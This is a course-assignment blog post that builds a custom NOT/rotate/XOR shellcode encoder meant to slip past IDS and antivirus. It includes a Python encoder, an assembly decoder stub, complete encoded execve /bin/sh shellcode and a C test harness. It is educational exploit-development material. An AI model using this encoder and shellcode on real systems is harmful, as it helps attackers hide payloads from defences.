# Assignment 4

* Create a custom encoding scheme like the "Insertion Encoder" we showed you
* PoC with using the execve-stack as the shellcode to encode with your schema and execute

## Execution

Even if null bytes or other kind of bad chars have been removed from the shellcode, its execution, in several scenarios, might be prevented due to IPS/IDS or antivirus. Thus, it comes the need to encode the shellcode with the goal of minimizing the surface fingerprintable. An encoder happens in two phase:

1. Encoding the shellcode using a schema defined. This can be done using any programming language;
2. Assembly routine that decodes the shellcode.

Let's dive into these two stages.

Firstly, I decided to use the following encoding schema:

* Execute a NOT on each shellcode byte;
* Execute a right bit ROTATE by a predefined number on each shellcode byte;
* Execute a XOR with a predefined byte on each shellcode byte.

Obviously, all these operations are invertible. Below, my implementation in Python using the *execve* payload.

```python
#!/usr/bin/python

# Author  : Alessio Parzian
# Filename: ShellEncoder.py
# Usage   : python ShellEncoder.py

# This script is an helper to encode any shellcode using a custom encoder

# Exec bin/sh shellcode
shellcode = "\xeb\x1a\x5e\x31\xdb\x88\x5e\x09\x89\x76\x0a\x89\x5e\x0e\x8d\x1e\x8d\x4e\x0a\x8d\x56\x0e\x31\xc0\xb0\x0b\xcd\x80\xe8\xe1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68\x41\x42\x42\x42\x42\x43\x43\x43\x43";

shellcode = bytearray(shellcode)

xor_fixed = 0xbb 
shift_fixed = 0x02

# This custom encoder makes use of three techniques in a chain
#	NOT encoding
#	ROTATE encoding
#	XOR encoding

for idx,opcode in enumerate(shellcode):
	# Apply NOT encoding
	opcode = ~opcode
	opcode = opcode & 0xff # Mask the result with the goal of preserving only the byte modified
	# Apply Rotation right
	opcode_shifted = opcode >> shift_fixed
	opcode_rotl = (opcode << (8 - shift_fixed)) & 0xff 
	opcode = opcode_shifted | opcode_rotl
	# Apply fixed xor
	opcode = (opcode ^ xor_fixed) & 0xff
	# Save encoded opcode
	shellcode[idx] = opcode

print '==========================='
print 'NOT + ROTATE + XOR'
print 'Shellcode length: {0}'.format(len(shellcode))
print '==========================='
shellcode_final = ""
shellcode_final_array = ""
for opcode in shellcode:
	shellcode_final += "\\x"+"{:02x}".format(opcode)
	shellcode_final_array += "0x"+"{:02x}".format(opcode)+","
shellcode_final_array = shellcode_final_array[:-1]
print shellcode_final
print shellcode_final_array
print '==========================='
```

The output of the above script is the following:

```
===========================
NOT + ROTATE + XOR
Shellcode length: 51
===========================
\xbe\xc2\xd3\x08\xb2\x66\xd3\x06\x26\xd9\xc6\x26\xd3\xc7\x27\xc3\x27\xd7\xc6\x27\xd1\xc7\x08\x74\x68\x86\x37\x64\x7e\x3c\xbb\xbb\xbb\x8f\xdc\x1e\xdf\x8f\xdc\x1c\x98\x5e\x14\xd4\xd4\xd4\xd4\x94\x94\x94\x94
0xbe,0xc2,0xd3,0x08,0xb2,0x66,0xd3,0x06,0x26,0xd9,0xc6,0x26,0xd3,0xc7,0x27,0xc3,0x27,0xd7,0xc6,0x27,0xd1,0xc7,0x08,0x74,0x68,0x86,0x37,0x64,0x7e,0x3c,0xbb,0xbb,0xbb,0x8f,0xdc,0x1e,0xdf,0x8f,0xdc,0x1c,0x98,0x5e,0x14,0xd4,0xd4,0xd4,0xd4,0x94,0x94,0x94,0x94
===========================
```

No null bytes present, great! Be sure, in case you change payload that no null bytes are there. In case there are, change the variable *xor_fixed* with a different byte or change the rotation value in the variable *shift_fixed*. Change the related decoding routing accordingly.

Now, let's move to the second part, the decoding routine in Assembly! The encoded shell has to be placed in the EncodedShell label.

```
; Author :  Alessio Parzian
; Filename: shell_encoded.asm

; compile with:
; 	nasm -f elf32 shellcode_encoded.asm
;	ld -o shellcode_encoded shellcode_encoded.o
; extract shellcode with:
; 	objdump -d shellcode_encoded | grep -Po '\s\K[a-f0-9]{2}(?=\s)' | sed 's/^/\\x/g' | perl -pe 's/\r?\n//' | sed 's/$/\n/'

global _start

section .text

	_start:
		jmp short call_shellcode
	
	decoder:
		pop esi
		xor ebx, ebx
		xor ecx, ecx
		xor edx, edx
		mov cl, 0x32 ; change the value based on the length of the encoded shellcode 
	
	decode:
		mov bl, byte [esi]
		xor bl, 0xbb
		and bl, 0xff
		mov dl, byte [esi]
		xor dl, 0xbb
		and dl, 0xff
		rol bl, 0x02
		and bl, 0xff
		ror dl, 0x06
		and bl, dl
		not bl
		mov byte [esi], bl
		inc esi
		loop decode
		; call the decoded shell
		jmp short EncodedShell

	call_shellcode:
		call decoder
		EncodedShell: db 0xbe,0xc2,0xd3,0x08,0xb2,0x66,0xd3,0x06,0x26,0xd9,0xc6,0x26,0xd3,0xc7,0x27,0xc3,0x27,0xd7,0xc6,0x27,0xd1,0xc7,0x08,0x74,0x68,0x86,0x37,0x64,0x7e,0x3c,0xbb,0xbb,0xbb,0x8f,0xdc,0x1e,0xdf,0x8f,0xdc,0x1c,0x98,0x5e,0x14,0xd4,0xd4,0xd4,0xd4,0x94,0x94,0x94,0x94

```

The decoding phase simply executes the inverse operations of the encoding schema. The JMP/CALL/POP technique has been used to gather the address of the encoded shellcode.
Once compiled the shellcode is the following.

```
\xeb\x2d\x5e\x31\xdb\x31\xc9\x31\xd2\xb1\x32\x8a\x1e\x80\xf3\xbb\x80\xe3\xff\x8a\x16\x80\xf2\xbb\x80\xe2\xff\xc0\xc3\x02\x80\xe3\xff\xc0\xca\x06\x20\xd3\xf6\xd3\x88\x1e\x46\xe2\xde\xeb\x05\xe8\xce\xff\xff\xff\xbe\xc2\xd3\x08\xb2\x66\xd3\x06\x26\xd9\xc6\x26\xd3\xc7\x27\xc3\x27\xd7\xc6\x27\xd1\xc7\x08\x74\x68\x86\x37\x64\x7e\x3c\xbb\xbb\xbb\x8f\xdc\x1e\xdf\x8f\xdc\x1c\x98\x5e\x14\xd4\xd4\xd4\xd4\x94\x94\x94\x94
```

The resulting shellcode does not contains null bytes, great! But, note that the size is doubled, from 51 bytes to 103 bytes. In case you need a smaller size, an operation of the encoding schema might be taken away.

For testing the shellcode generated the following helper program was used.

```c
/*
// Author: Alessio Parzian
// Filename: test_shell.c
//
// Test your shellcode. Replace shellcode variable value with your own shell, compile and execute.
// Compile with:
// 	gcc $file_name -fno-stack-protector -z execstack -o $out_name
*/

#include <stdio.h>

// Use an array instead of a pointer because compiler does consider the array as mutable (this implies you can modify it at runtime). For pointers to literal this is not the case unless specific flag is passed to the compiler. This is very important when modifing at runtime the shellcode.
unsigned char shellcode[] = "\xeb\x2d\x5e\x31\xdb\x31\xc9\x31\xd2\xb1\x32\x8a\x1e\x80\xf3\xbb\x80\xe3\xff\x8a\x16\x80\xf2\xbb\x80\xe2\xff\xc0\xc3\x02\x80\xe3\xff\xc0\xca\x06\x20\xd3\xf6\xd3\x88\x1e\x46\xe2\xde\xeb\x05\xe8\xce\xff\xff\xff\xbe\xc2\xd3\x08\xb2\x66\xd3\x06\x26\xd9\xc6\x26\xd3\xc7\x27\xc3\x27\xd7\xc6\x27\xd1\xc7\x08\x74\x68\x86\x37\x64\x7e\x3c\xbb\xbb\xbb\x8f\xdc\x1e\xdf\x8f\xdc\x1c\x98\x5e\x14\xd4\xd4\xd4\xd4\x94\x94\x94\x94";

int main (){
	void (*shell)(void) = (void(*)(void)) shellcode;
	shell();
}
```

Well, this concludes assignment 4!

<br/>

---

*This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification.*

<http://securitytube-training.com/online-courses/security-tube-linux-assembly-expert>

*Student-ID: PA-8733*